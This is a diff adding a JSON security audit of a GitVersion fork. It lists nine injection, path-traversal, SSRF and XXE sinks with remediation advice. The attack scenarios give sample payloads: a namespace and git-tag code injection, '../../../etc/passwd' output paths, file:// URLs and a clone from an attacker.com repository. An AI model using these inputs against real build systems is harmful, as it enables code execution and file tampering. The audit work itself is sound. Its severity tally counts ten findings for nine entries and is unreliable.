@@ -1,0 +1,259 @@
+{
+  "audit_date": "2026-09-21",
+  "repository": "fzlzjerry/GitVersion",
+  "scopes": ["src/", "new-cli/"],
+  "dangerous_sinks_found": [
+    {
+      "id": "SINK-001",
+      "type": "Code Injection via Template Rendering",
+      "severity": "HIGH",
+      "title": "Namespace injection in generated C# code",
+      "description": "RootNamespace (from MSBuild task) flows unsanitized into C# namespace declaration, allowing code injection",
+      "attacker_controlled_input": [
+        "GenerateGitVersionInformation.RootNamespace (MSBuild property)",
+        "GenerateGitVersionInformation.ProjectFile (file name used as fallback namespace)"
+      ],
+      "dangerous_sink": "string.Format(template, ..., targetNamespace, ...)",
+      "file_and_line": "src/GitVersion.Output/GitVersionInfo/GitVersionInfoGenerator.cs:57",
+      "code_context": {
+        "vulnerable_code": "var fileContents = string.Format(template, members, targetNamespace, openBracket, closeBracket, indent);\n\nif (fileContents != originalFileContents)\n{\n    this.fileSystem.File.WriteAllText(filePath, fileContents);\n}",
+        "template_location": "src/GitVersion.Output/GitVersionInfo/Templates/GitVersionInformation.cs",
+        "namespace_injection_point": "Line 70: \".cs\" => context.TargetNamespace != null ? $\"{FileSystemHelper.Path.NewLine}namespace {context.TargetNamespace}\" : \"\""
+      },
+      "attack_scenario": "Attacker controls RootNamespace property in MSBuild task or project file → injects C# code like: 'System { class Pwned {} }' → Generated code contains injected namespace → Code compilation includes attacker payload",
+      "impact": "Arbitrary code execution during compilation",
+      "files_affected": [
+        "src/GitVersion.Output/GitVersionInfo/GitVersionInfoGenerator.cs:57",
+        "src/GitVersion.Output/GitVersionInfo/GitVersionInfoContext.cs:5 (TargetNamespace parameter)",
+        "src/GitVersion.MsBuild/GitVersionTaskExecutor.cs:92 (RootNamespace assignment)"
+      ]
+    },
+    {
+      "id": "SINK-002",
+      "type": "Template Injection in Assembly Info",
+      "severity": "HIGH",
+      "title": "Version variables interpolated unsanitized into code generation templates",
+      "description": "GitVersionVariables (from git history) are formatted directly into code using string.Format without escaping. Malicious version numbers (e.g., via git tags) could inject code.",
+      "attacker_controlled_input": [
+        "Git tag names / version strings (AssemblySemVer, InformationalVersion, etc.)",
+        "Environment variables passed as version overrides"
+      ],
+      "dangerous_sink": "string.Format(indentation + addFormat, v.Key, v.Value)",
+      "file_and_line": "src/GitVersion.Output/GitVersionInfo/GitVersionInfoGenerator.cs:54",
+      "code_context": {
+        "vulnerable_code": "var lines = variables.OrderBy(x => x.Key).Select(v => string.Format(indentation + addFormat, v.Key, v.Value));",
+        "template_format": "addFormat template from embedded resources (e.g., GitVersionInformation.cs)"
+      },
+      "attack_scenario": "Git repository with crafted tag like '1.0.0\"; /* injected */ public string Payload = \"' → Version variables parsed from tag → string.Format inserts into template → Generated C# contains injected code",
+      "impact": "Code injection during version generation; arbitrary code execution at compile time",
+      "files_affected": [
+        "src/GitVersion.Output/GitVersionInfo/GitVersionInfoGenerator.cs:54",
+        "src/GitVersion.Output/TemplateManager.cs (embedded templates)"
+      ],
+      "note": "Also affects AssemblyInfo generation via same mechanism at src/GitVersion.Output/AssemblyInfo/AssemblyInfoFileUpdater.cs:144"
+    },
+    {
+      "id": "SINK-003",
+      "type": "Path Traversal in File Write",
+      "severity": "MEDIUM",
+      "title": "OutputFile path not validated before write",
+      "description": "OutputFile argument is passed directly to File.WriteAllText without path normalization or directory traversal validation",
+      "attacker_controlled_input": [
+        "GitVersionOptions.OutputFile (CLI arg /outputfile)",
+        "OutputContext.OutputFile"
+      ],
+      "dangerous_sink": "this.fileSystem.File.WriteAllText(context.OutputFile, json)",
+      "file_and_line": "src/GitVersion.Output/OutputGenerator/OutputGenerator.cs:82",
+      "code_context": {
+        "vulnerable_code": "if (context.OutputFile != null)\n{\n    this.fileSystem.File.WriteAllText(context.OutputFile, json);\n}",
+        "file_path_origin": "ArgumentParser.cs line 150: arguments.OutputFile = outputFile (no validation)"
+      },
+      "attack_scenario": "GitVersion called with /outputfile=../../../etc/passwd (or similar Windows equivalent) → JSON written to arbitrary location outside intended directory",
+      "impact": "Write arbitrary files to filesystem (if permissions allow)",
+      "files_affected": [
+        "src/GitVersion.Output/OutputGenerator/OutputGenerator.cs:82",
+        "src/GitVersion.App/ArgumentParser.cs:150"
+      ]
+    },
+    {
+      "id": "SINK-004",
+      "type": "Path Traversal in Config File Loading",
+      "severity": "MEDIUM",
+      "title": "ConfigurationFile path combined with user input without normalization",
+      "description": "ConfigurationFile argument is combined with TargetPath using Path.Combine and later read. While there is some validation, Path.Combine doesn't prevent traversal if second arg is rooted.",
+      "attacker_controlled_input": [
+        "GitVersionOptions.ConfigurationFile (CLI arg /configfile)",
+        "GitVersionOptions.WorkingDirectory (CLI arg)"
+      ],
+      "dangerous_sink": "this.fileSystem.File.ReadAllText(configFilePath)",
+      "file_and_line": "src/GitVersion.Configuration/ConfigurationProvider.cs:90",
+      "code_context": {
+        "vulnerable_code": "var content = this.fileSystem.File.ReadAllText(configFilePath);",
+        "config_path_resolution": "ArgumentParser.cs line 537-548: combines TargetPath + ConfigurationFile with GetFullPath"
+      },
+      "attack_scenario": "If validation at line 530 is bypassed or incomplete: config file loaded from unintended location → YAML deserialized → Potential for XXE or other injection if YAML parser is vulnerable",
+      "impact": "Read arbitrary files (limited by permissions); potential deserialization attack",
+      "files_affected": [
+        "src/GitVersion.Configuration/ConfigurationProvider.cs:90",
+        "src/GitVersion.App/ArgumentParser.cs:537-548"
+      ]
+    },
+    {
+      "id": "SINK-005",
+      "type": "SSRF via HttpClient BaseAddress",
+      "severity": "MEDIUM",
+      "title": "Unvalidated environment variable used as HTTP endpoint",
+      "description": "APPVEYOR_API_URL environment variable flows directly to HttpClient BaseAddress without URL validation or scheme checking",
+      "attacker_controlled_input": [
+        "APPVEYOR_API_URL environment variable (attacker-controlled in compromised build environment)"
+      ],
+      "dangerous_sink": "new Uri(apiUrl) → HttpClient.BaseAddress",
+      "file_and_line": "src/GitVersion.BuildAgents/Agents/AppVeyor.cs:63",
+      "code_context": {
+        "vulnerable_code": "private static HttpClient GetHttpClient(string apiUrl) => new()\n{\n    BaseAddress = new Uri(apiUrl)\n};",
+        "env_var_source": "Line 16: this.environment.GetEnvironmentVariable(\"APPVEYOR_API_URL\")"
+      },
+      "attack_scenario": "In AppVeyor build environment, if APPVEYOR_API_URL is set to 'http://internal.service.local' or 'file:///' → HTTP requests sent to attacker-controlled endpoint or internal services",
+      "impact": "Server-Side Request Forgery (SSRF) to access internal services or redirect requests",
+      "files_affected": [
+        "src/GitVersion.BuildAgents/Agents/AppVeyor.cs:18,43,63"
+      ]
+    },
+    {
+      "id": "SINK-006",
+      "type": "XXE Potential in XML Deserialization",
+      "severity": "LOW",
+      "title": "XmlDocument.LoadXml used without DTD restrictions",
+      "description": "XmlDocument without DTD processing disabled could be vulnerable to XXE if content is attacker-controlled",
+      "attacker_controlled_input": [
+        "GitVersionVariables (which flow into XML generation)"
+      ],
+      "dangerous_sink": "doc.LoadXml(GetWixFormatFromVersionVariables(variables))",
+      "file_and_line": "src/GitVersion.Output/WixUpdater/WixVersionFileUpdater.cs:20",
+      "code_context": {
+        "vulnerable_code": "var doc = new XmlDocument();\ndoc.LoadXml(GetWixFormatFromVersionVariables(variables));",
+        "note": "XML is GENERATED, not user-controlled input, so risk is LOW. GetWixFormatFromVersionVariables constructs it from version variables using StringBuilder.Append."
+      },
+      "attack_scenario": "Version variables with special XML characters (e.g., version='1.0\"> <![CDATA[INJECTION]]> <') → If not properly escaped in GetWixFormatFromVersionVariables, could break XML structure",
+      "impact": "XML structure corruption or injection (actual XXE unlikely since XML is generated, not parsed from user input)",
+      "files_affected": [
+        "src/GitVersion.Output/WixUpdater/WixVersionFileUpdater.cs:20,40-50"
+      ]
+    },
+    {
+      "id": "SINK-007",
+      "type": "Reflection + Activator.CreateInstance",
+      "severity": "LOW",
+      "title": "Activator.CreateInstance with type from version variables",
+      "description": "Activator.CreateInstance is used to deserialize GitVersionVariables, but only for known GitVersionVariables type (not user-controlled type names)",
+      "attacker_controlled_input": [
+        "JSON file content (GitVersionVariables.FromJson); type is fixed to GitVersionVariables"
+      ],
+      "dangerous_sink": "Activator.CreateInstance(type, ctorArgs)",
+      "file_and_line": "src/GitVersion.Output/Serializer/VersionVariableSerializer.cs:77",
+      "code_context": {
+        "vulnerable_code": "var instance = Activator.CreateInstance(type, ctorArgs).NotNull();",
+        "type_origin": "typeof(GitVersionVariables) - FIXED, not user-controlled"
+      },
+      "attack_scenario": "Not exploitable in normal flow since type is hardcoded to GitVersionVariables. JSON deserialization via JsonSerializer (safer than BinaryFormatter) with context-based type.",
+      "impact": "No direct risk; type is not attacker-controlled",
+      "files_affected": [
+        "src/GitVersion.Output/Serializer/VersionVariableSerializer.cs:70-77"
+      ],
+      "risk_level": "NONE - mitigated by fixed type"
+    },
+    {
+      "id": "SINK-008",
+      "type": "XML XElement.Parse on Project File",
+      "severity": "LOW",
+      "title": "XElement.Parse on project file content without DTD restrictions",
+      "description": "Project file (csproj/vbproj) is parsed with XElement.Parse which could be vulnerable to XXE if project file is attacker-controlled",
+      "attacker_controlled_input": [
+        "Project file content (*.csproj, *.vbproj) in repository"
+      ],
+      "dangerous_sink": "fileXml = XElement.Parse(originalFileContents)",
+      "file_and_line": "src/GitVersion.Output/AssemblyInfo/ProjectFileUpdater.cs:53",
+      "code_context": {
+        "vulnerable_code": "try\n{\n    fileXml = XElement.Parse(originalFileContents);\n}\ncatch (XmlException e)\n{\n    throw new XmlException($\"Unable to parse file as xml: {localProjectFile}\", e);\n}"
+      },
+      "attack_scenario": "Attacker controls .csproj in repository → injects XXE payload → XXE executed during GitVersion execution",
+      "impact": "XXE vulnerability (file disclosure, SSRF) if XXE payloads in project file are not filtered",
+      "files_affected": [
+        "src/GitVersion.Output/AssemblyInfo/ProjectFileUpdater.cs:53"
+      ],
+      "note": "XElement.Parse in .NET does NOT process external entities by default (XElement uses XmlReaderSettings with safe defaults), so XXE risk is LOW"
+    },
+    {
+      "id": "SINK-009",
+      "type": "LibGit2Sharp.Clone with Remote URL",
+      "severity": "MEDIUM",
+      "title": "Git repository URL not validated before clone",
+      "description": "Repository URL from CLI args passed directly to Repository.Clone without URL validation or scheme checking",
+      "attacker_controlled_input": [
+        "GitVersionOptions.RepositoryInfo.TargetUrl (CLI arg /targeturl)"
+      ],
+      "dangerous_sink": "Repository.Clone(sourceUrl, workdirPath, GetCloneOptions(auth))",
+      "file_and_line": "src/GitVersion.LibGit2Sharp/Git/GitRepository.mutating.cs:15",
+      "code_context": {
+        "vulnerable_code": "public void Clone(string? sourceUrl, string? workdirPath, AuthenticationInfo auth)\n{\n    try\n    {\n        var path = Repository.Clone(sourceUrl, workdirPath, GetCloneOptions(auth));",
+        "url_origin": "ArgumentParser.cs line 286: arguments.TargetUrl = parseResult.GetValue(options.TargetUrl)"
+      },
+      "attack_scenario": "GitVersion /targeturl=file:///etc/passwd → Attempts to clone from local filesystem → LibGit2Sharp may reject (but depends on version) or GitVersion /targeturl=https://attacker.com/malicious.git → Clones malicious repo",
+      "impact": "Git protocol attacks, local file disclosure, credential exposure if auth is provided",
+      "files_affected": [
+        "src/GitVersion.LibGit2Sharp/Git/GitRepository.mutating.cs:15",
+        "src/GitVersion.App/ArgumentParser.cs:286"
+      ]
+    }
+  ],
+  "summary": {
+    "total_findings": 9,
+    "high_severity": 2,
+    "medium_severity": 4,
+    "low_severity": 3,
+    "none_severity": 1,
+    "critical_patterns": [
+      {
+        "pattern": "Namespace injection in generated code (SINK-001)",
+        "impact": "Code injection at compile time → RCE",
+        "requires_fix": true
+      },
+      {
+        "pattern": "Version variable injection into templates (SINK-002)",
+        "impact": "Code injection via git tags → RCE",
+        "requires_fix": true
+      },
+      {
+        "pattern": "Unvalidated HTTP endpoints (SINK-005)",
+        "impact": "SSRF to internal services",
+        "requires_fix": true
+      }
+    ]
+  },
+  "remediation_recommendations": [
+    {
+      "finding_id": "SINK-001",
+      "recommendation": "Sanitize/validate RootNamespace before using in code generation. Use a whitelist of allowed characters (alphanumeric, dots, underscores). Use CSharpSyntaxTree.ParseText or Roslyn to validate syntax rather than string.Format."
+    },
+    {
+      "finding_id": "SINK-002",
+      "recommendation": "Escape version variable values before string interpolation. Use HTML/XML encoding or escape special characters. Better: use AST-based code generation (Roslyn) instead of string.Format templates."
+    },
+    {
+      "finding_id": "SINK-003",
+      "recommendation": "Validate OutputFile path: ensure it's within working directory, use Path.GetFullPath and check it doesn't traverse parent directories."
+    },
+    {
+      "finding_id": "SINK-004",
+      "recommendation": "Strengthen ConfigurationFile path validation. Use Path.GetFullPath and verify result is within allowed directories. Consider whitelist of allowed paths."
+    },
+    {
+      "finding_id": "SINK-005",
+      "recommendation": "Validate APPVEYOR_API_URL: whitelist allowed hosts, use Uri.TryCreate with UriKind.Absolute, reject file:// and other non-http(s) schemes."
+    },
+    {
+      "finding_id": "SINK-009",
+      "recommendation": "Validate TargetUrl: reject file:// and ssh:// schemes (or whitelist https:// only), use Uri validation before passing to Clone."
+    }
+  ]
+}
